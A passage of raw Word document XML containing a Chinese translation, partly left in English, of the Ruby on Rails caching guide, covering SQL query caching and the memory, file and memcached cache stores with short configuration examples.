          <w:p w14:paraId="53EF537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1F6102A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67AE6F2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4FEE5DBF"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1.5 SQL 缓存</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="068F361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查询缓存是 Rails 的一个特性，它缓存了每一个数据库查询的结果集，这样如果 Rails 再次遇到那个请求中的同样的查询，它将会使用缓存的结果集而不是到数据库中继续查询。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F1AD1B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例如：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5160"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="68D25ED8" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="02EB5C2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ProductsController &lt; ActionController</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1A3A15E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41666C4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index</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="11549CD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Run a find query</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="76127F2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@products</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>= Product.all</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3EA6110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03E91DF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w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="212FDC2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441CD5C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Run the same query again</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2142DDF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@products</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>= Product.all</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1D49DA9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3553C3D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698D325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698D79B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第二次对数据库运行相同的查询，它实际上并不到数据库查询。第一次查询返回的结果存储在查询缓存（内存）中，第二次就直接从内存中读取。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7383DF0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然而，需要注意查询缓存在一个 action 的开始时创建，在 action 结束时清除，只持续在这个 action 的期间。如果希望在一个更持久的方式中存储查询结果，可以在 Rails 中使用低级别的缓存。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25104FE3"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2 缓存存储</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DD5756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Rails 对通过 action 或片段缓存的数据提供不同的存储方式。页面缓存通常存储在硬盘上。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0106DF1F"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2.1 配置</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FAA59F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可以在程序配置时通过修改在 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config/application.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 中的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config.cache_store=</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 选项来设置应用程序的默认缓存存储方式，或者在特定的环境配置文件（如 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config/environments/*.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>)的 Application.configure 块中设置。第一个参数指定使用的缓存存储方式，其他的参数会传递到缓存构造器中。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4080"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="24BA3B6F" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="45493670" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1269309989"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>config.cache_store = :memory_store</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1786D58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也可以在配置块之外调用 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>ActionController::Base.cache_store</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AB9C14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可以通过调用 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Rails.cache</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 来读写 cache。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3339A873"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2.2 ActiveSupport::Cache::Store</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="460018D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这个类提供了 Rails 中缓存交互的基础，它是个抽象类，不能直接使用。相反，你需要使用这个类的一个具体实现绑定到一个存储引擎。 Rails 下面提供了几种具体实现的文档。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CC5105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主要的调用的方法为 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>read</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">write, </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>delete</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>exist?</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>fetch+。fetch 方法使用一个块，将会返回一个缓存中已有的值，当值不存在时则执行块，然后把结果写到缓存中。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F10FAE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有许多在所有缓存实现中通用的选项。这些可以传递到构造器，或者与各种方法交互。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="497732B5" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="252"/>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:namespace</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> – 这个选项在缓存存储创建命名空间时使用。在应用程序和其他应用程序共享一个缓存的情况下，这是非常有用的。默认的值将会包含应用程序名称和 Rails 环境。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CE13712" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="253"/>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:compress</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> – 这个选项用来指明在缓存中使用压缩。在速度较慢的网络中传输较大的缓存内容时非常有用。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="670AAE44" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="254"/>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:compress_threshold</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> － 这个选项和 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>compress</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 一起使用，来确定缓存内容不压缩的界限。默认为16K（千字节）。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FCC42F1" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="255"/>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:expires_in</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> – 这个选项设置一个以秒为单位的失效时间，这样缓存的条目将会自动从缓存中移除。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A30E207" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="256"/>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:race_condition_ttl</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> – 这个选项和 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>expires_in</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 共同使用。它会在缓存失效时，从同时再产生的相同条目（也被称为 dog pile 效应）中阻止多个进程，以阻止竞争条件。该选项设置了一个失效的条目在已有新值生成的情况下可以被再次使用的秒数。如果使用了 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:expires_in</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 选项，则最好设置该值。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="405C1583"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2.3 ActiveSupport::Cache::MemoryStore</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27B21CE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该缓存存储将在相同的 Ruby 进程中的缓存条目保存在内存中。它可以在初始化时通过设定 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:size</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 选项来限定缓存内容的大小（默认为32M）。当缓存超过了分配的大小，会做一次清理，将最近使用最少的条目移除。</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71629095" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="770AB8DB" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="99646447"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>ActionController::Base.cache_store = :memory_store, :size</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; 64.megabytes</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6D519B0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如果你运行多个 Ruby on Rails 服务进程（如使用 mongrel_cluster 或 Phusion Passenger）， Rails 服务进程实例彼此间不能共享缓存数据。这个缓存存储不适合部署大应用程序，但是在小的，只有少数的服务进程的低流量网站或开发及测试环境下使用还是很不错 的。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EB5B2A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该缓存存储是默认的缓存存储实现方式。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B93EA1D"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2.4 ActiveSupport::Cache::FileStore</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="048949F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该缓存存储方式使用文件系统存储缓存条目。存储文件的目录路径需要在初始化缓存时确定。</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3410ACC3" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="21E6F34E" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="984628783"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>ActionController::Base.cache_store = :file_store, "/path/to/cache/directory"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7EC07BD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使用该缓存存储，相同主机的多服务进程可以共享一个缓存。不同主机的服务进程也可以使用同一个共享文件系统来共享缓存。但是这样的结构不是完美的，也不推荐使用。该缓存存适合一或两个主机的低到中流量网站。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="395CFB5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注意：缓存将会不断增加，直到磁盘满了为止，所以需要定期清理旧的缓存内容。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F233703"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2.5 ActiveSupport::Cache::MemCacheStore</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="450231F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This cache store uses Danga’s </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>memcached</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> server to provide a centralized cache for your application. Rails uses the bundled </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>memcache-client</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> gem by default. This is currently the most popular cache store for production websites. It can be used to provide a single, shared cache cluster with very a high performance and redundancy.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00440D0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该缓存存储使用 Danga 的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>memcached</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 服务来为应用程序提供集中缓存。Rails 默认使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>memcache-client</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> gem。这是现在网站生产环境下使用的最流行的缓存存储方式。它提供高性能、备份的单一共享 cluster （簇）。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DB48AC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When initializing the cache, you need to specify the addresses for all memcached servers in your cluster. If none is specified, it will assume memcached is running on the local host on the default port, but this is not an ideal set up for larger sites.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="223CC7D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在初始化缓存时，需要在 cluster（簇） 中指定所有 memcached 服务器的地址。若没指定，将会认为 memcached 运行在本地主机的默认端口，对于大型网站来说，这不是完美的。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10CB594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The </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>write</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>fetch</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> methods on this cache accept two additional options that take advantage of features specific to memcached. You can specify </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:raw</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
